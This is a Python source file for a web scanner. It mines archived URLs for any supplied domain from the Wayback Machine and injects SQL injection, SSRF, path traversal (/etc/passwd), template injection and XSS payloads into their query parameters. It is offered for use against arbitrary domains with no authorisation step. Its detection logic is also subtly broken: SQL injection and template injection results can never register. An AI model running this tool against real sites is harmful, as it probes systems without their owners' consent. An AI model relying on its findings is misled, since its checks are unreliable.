import argparse
import logging
import os
import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode
from aiohttp import ClientSession, ClientTimeout, ClientError
from colorama import Fore, Style, init
from tqdm.asyncio import tqdm

# Initialize colorama
init(autoreset=True)

# Constants
HARDCODED_EXTENSIONS = [
    ".jpg", ".jpeg", ".png", ".gif", ".pdf", ".svg", ".json",
    ".css", ".js", ".webp", ".woff", ".woff2", ".eot", ".ttf", ".otf", ".mp4", ".txt"
]
RESULTS_DIR = "Output"

# Logging Configuration
logging.basicConfig(format='%(message)s', level=logging.INFO)
logger = logging.getLogger()

# Helper Functions
def has_extension(url, extensions):
    extension = os.path.splitext(urlparse(url).path)[1].lower()
    return extension in extensions


def clean_url(url):
    parsed_url = urlparse(url)
    if (parsed_url.port == 80 and parsed_url.scheme == "http") or (parsed_url.port == 443 and parsed_url.scheme == "https"):
        parsed_url = parsed_url._replace(netloc=parsed_url.netloc.split(":")[0])
    return parsed_url.geturl()


def clean_urls(urls, domain, extensions, placeholder):
    cleaned_urls = set()
    for url in urls:
        cleaned_url = clean_url(url)

        if domain not in urlparse(cleaned_url).netloc:
            continue

        if has_extension(cleaned_url, extensions):
            continue

        parsed_url = urlparse(cleaned_url)
        query_params = parse_qs(parsed_url.query)
        cleaned_params = {key: placeholder for key in query_params}
        cleaned_query = urlencode(cleaned_params, doseq=True)

        final_url = parsed_url._replace(query=cleaned_query).geturl()
        cleaned_urls.add(final_url)

    return list(cleaned_urls)


async def fetch_url_content(session, url, proxy=None, retries=3):
    for attempt in range(retries):
        try:
            async with session.get(url, proxy=proxy, timeout=ClientTimeout(total=10)) as response:
                response.raise_for_status()
                return await response.text()
        except ClientError:
            if attempt == retries - 1:
                logger.error(f"{Fore.RED}❌ Failed to fetch URL {url} after {retries} attempts.")
                return None


async def fetch_and_clean_urls(session, domain, extensions, placeholder, proxy, stream_output):
    logger.info(f"{Fore.BLUE}🔍 Finding URLs for {domain} 🌐")
    wayback_uri = f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=txt&collapse=urlkey&fl=original&page=/"
    content = await fetch_url_content(session, wayback_uri, proxy)

    if not content:
        logger.warning(f"{Fore.YELLOW}⚠️ Nothing found for {domain} 🚫")
        return

    urls = content.splitlines()
    cleaned_urls = clean_urls(urls, domain, extensions, placeholder)
    logger.info(f"{Fore.GREEN}✅ Found {len(cleaned_urls)} Filtered URLs for {domain} 🎉")

    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)

    result_file = os.path.join(RESULTS_DIR, f"{domain}.txt")
    with open(result_file, "w") as f:
        for url in cleaned_urls:
            if "?" in url:
                f.write(url + "\n")
                if stream_output:
                    print(f"{Fore.CYAN}🔗 {url}")

    logger.info(f"{Fore.MAGENTA}📁 Saved Filtered URLs to {result_file} 📝")


async def perform_injection_tests(session, url, injection_type, payloads, proxy, retries, ssrf_server=None):
    logger.info(f"{Fore.YELLOW}🔍 Testing {injection_type} on {url}")
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    results = []  # Store results for positive findings
    for param in query_params:
        for payload in payloads:
            test_params = {k: payload if k == param else v[0] for k, v in query_params.items()}
            test_query = urlencode(test_params)

            test_url = parsed_url._replace(query=test_query).geturl()
            response_body = await fetch_url_content(session, test_url, proxy, retries)
            if not response_body:
                continue

            if injection_type == "SQL Injection" and "syntax" in response_body.lower():
                results.append((param, injection_type, payload, response_body))
            elif injection_type == "SSRF" and ssrf_server and ssrf_server in response_body:
                results.append((param, injection_type, payload, response_body))
            elif injection_type == "LFI" and "root:x" in response_body.lower():
                results.append((param, injection_type, payload, response_body))
            elif injection_type == "SSTI" and "test_ssti" in response_body:
                results.append((param, injection_type, payload, response_body))
            elif injection_type == "XSS" and payload in response_body:
                results.append((param, injection_type, payload, response_body))
            elif injection_type == "Command Injection" and "bash" in response_body:
                results.append((param, injection_type, payload, response_body))

    return results


async def process_domains(domains, extensions, placeholder, proxy, user_agent, max_tasks, stream_output, injection_checks, ssrf_server, reflected_only):
    connector = aiohttp.TCPConnector(limit=max_tasks)
    headers = {"User-Agent": user_agent}

    async with ClientSession(connector=connector, headers=headers) as session:
        tasks = [
            fetch_and_clean_urls(session, domain, extensions, placeholder, proxy, stream_output)
            for domain in domains
        ]
        for task in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="Processing Domains 🌍"):
            await task

        for domain in domains:
            result_file = os.path.join(RESULTS_DIR, f"{domain}.txt")
            if os.path.exists(result_file):
                with open(result_file, "r") as f:
                    urls = f.read().splitlines()
                    for url in urls:
                        # Skip URLs without query parameters
                        if not urlparse(url).query:
                            logger.info(f"{Fore.YELLOW}ℹ️ Skipping non-parameterized URL: {url}")
                            continue

                        # Only include reflected parameters if specified
                        if reflected_only and placeholder not in url:
                            continue

                        domain_results = []  # Store all results for the current domain

                        # Perform vulnerability checks
                        for vuln_type, payloads in injection_checks.items():
                            if vuln_type == "ssrf" and not ssrf_server:
                                logger.warning(f"{Fore.RED}❌ SSRF testing requires a valid --ssrf-server URL.")
                                continue
                            domain_results += await perform_injection_tests(
                                session, url, vuln_type.upper(), payloads, proxy, retries=3, ssrf_server=ssrf_server
                            )

                        # Output summarized results
                        if domain_results:
                            logger.info(f"\n{Fore.GREEN}=== Vulnerabilities Found for {url} ===")
                            for param, vuln_type, payload, response in domain_results:
                                logger.info(f"{Fore.GREEN}[+] {vuln_type} detected!")
                                logger.info(f"    Parameter: {param}")
                                logger.info(f"    Payload: {payload}")
                                logger.info(f"    Response Snippet: {response[:200]}")
                        else:
                            logger.info(f"{Fore.CYAN}ℹ️ No vulnerabilities found for {url}")


def load_domains(domain_file=None, domain_name=None):
    if domain_file:
        with open(domain_file, "r") as f:
            domains = [line.strip().lower().replace('https://', '').replace('http://', '') for line in f.readlines()]
            return list(set(filter(None, domains)))
    elif domain_name:
        return [domain_name.lower().replace('https://', '').replace('http://', '')]
    else:
        raise ValueError("Either domain_file or domain_name must be provided")


def main():
    log_text = f"""
               {Fore.RED}      
                                                                                                                                                                                                          
{Fore.WHITE} ███████████                                     {Fore.RED}            █████ █████      {Fore.WHITE}      ████                             
{Fore.WHITE}░░███░░░░░███                                  {Fore.RED}             ░░███ ░░███     {Fore.WHITE}       ░░███                             
{Fore.WHITE} ░███    ░███  ██████   ████████   ██████   █████████████ {Fore.RED}   ░░███ ███   {Fore.WHITE} ████████  ░███   ██████  ████████   ██████ 
{Fore.WHITE} ░██████████  ░░░░░███ ░░███░░███ ░░░░░███ ░░███░░███░░███{Fore.RED}    ░░█████    {Fore.WHITE}░░███░░███ ░███  ███░░███░░███░░███ ███░░███
{Fore.WHITE} ░███░░░░░░    ███████  ░███ ░░░   ███████  ░███ ░███ ░███ {Fore.RED}    ███░███    {Fore.WHITE}░███ ░███ ░███ ░███ ░███ ░███ ░░░ ░███████ 
{Fore.WHITE} ░███         ███░░███  ░███      ███░░███  ░███ ░███ ░███ {Fore.RED}   ███ ░░███   {Fore.WHITE}░███ ░███ ░███ ░███ ░███ ░███     ░███░░░  
{Fore.WHITE} █████       ░░████████ █████    ░░████████ █████░███ █████{Fore.RED}  █████ █████  {Fore.WHITE}░███████  █████░░██████  █████    ░░██████ 
{Fore.WHITE}░░░░░         ░░░░░░░░ ░░░░░      ░░░░░░░░ ░░░░░ ░░░ ░░░░░ {Fore.RED} ░░░░░ ░░░░░   {Fore.WHITE}░███░░░  ░░░░░  ░░░░░░  ░░░░░      ░░░░░░  
                                                                        {Fore.WHITE}  ░███                                       
                                                                       {Fore.WHITE}   █████                                      
                                                                        {Fore.WHITE} ░░░░░      

                                         🌟 Automated Parameter Finder & Injector 🌟                                  
                                                         by {Fore.RED}0xarshad 
    """
    logger.info(log_text)

    parser = argparse.ArgumentParser(description="Mining URLs from dark corners of Web Archives 🌐")
    parser.add_argument("-d", "--domain", help="Domain name to fetch related URLs for.")
    parser.add_argument("-l", "--list", help="File containing a list of domain names.")
    parser.add_argument("-s", "--stream", action="store_true", help="Stream URLs on the terminal.")
    parser.add_argument("--proxy", help="Set the proxy address for web requests.", default=None)
    parser.add_argument("--user-agent", help="Set a custom User-Agent for requests.", default="URLMiner/1.0")
    parser.add_argument("--max-tasks", help="Maximum number of concurrent tasks.", type=int, default=10)
    parser.add_argument("-p", "--placeholder", help="Placeholder for parameter values", default="FUZZ")
    parser.add_argument("--reflected", action="store_true", help="Only include reflected parameters in URLs.")
    parser.add_argument("--check-all", action="store_true", help="Check for all vulnerabilities.")
    parser.add_argument("--check-sql", action="store_true", help="Check for SQL injection vulnerabilities.")
    parser.add_argument("--check-ssrf", action="store_true", help="Check for SSRF vulnerabilities.")
    parser.add_argument("--check-lfi", action="store_true", help="Check for LFI vulnerabilities.")
    parser.add_argument("--check-ssti", action="store_true", help="Check for SSTI vulnerabilities.")
    parser.add_argument("--check-xss", action="store_true", help="Check for XSS vulnerabilities.")
    parser.add_argument("--ssrf-server", help="Custom server address for SSRF payloads (e.g., http://example.com)", default=None)
    args = parser.parse_args()

    if not args.domain and not args.list:
        parser.error(f"{Fore.RED}❌ Please provide either the -d option or the -l option.")
    if args.domain and args.list:
        parser.error(f"{Fore.RED}❌ Please provide either the -d option or the -l option, not both.")

    # Ensure SSRF server is provided if SSRF checks are enabled
    if args.check_ssrf and not args.ssrf_server:
        parser.error(f"{Fore.RED}❌ SSRF testing requires the --ssrf-server option.")

    domains = load_domains(args.list, args.domain)
    extensions = HARDCODED_EXTENSIONS
    placeholder = args.placeholder

    # Define injection payloads for each vulnerability type
    injection_checks = {}
    if args.check_all or args.check_sql:
        injection_checks["sql"] = ["' OR '1'='1", "' AND 1=1 --", "' OR sleep(5) --"]
    if args.check_all or args.check_ssrf:
        injection_checks["ssrf"] = [f"{args.ssrf_server}/test", f"{args.ssrf_server}/ping"]
    if args.check_all or args.check_lfi:
        injection_checks["lfi"] = ["../../../../etc/passwd", "../../../windows/system.ini"]
    if args.check_all or args.check_ssti:
        injection_checks["ssti"] = ["{{7*7}}", "${{7*7}}"]
    if args.check_all or args.check_xss:
        injection_checks["xss"] = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

    asyncio.run(process_domains(domains, extensions, placeholder, args.proxy, args.user_agent, args.max_tasks, args.stream, injection_checks, args.ssrf_server, args.reflected))


if __name__ == "__main__":
    main()
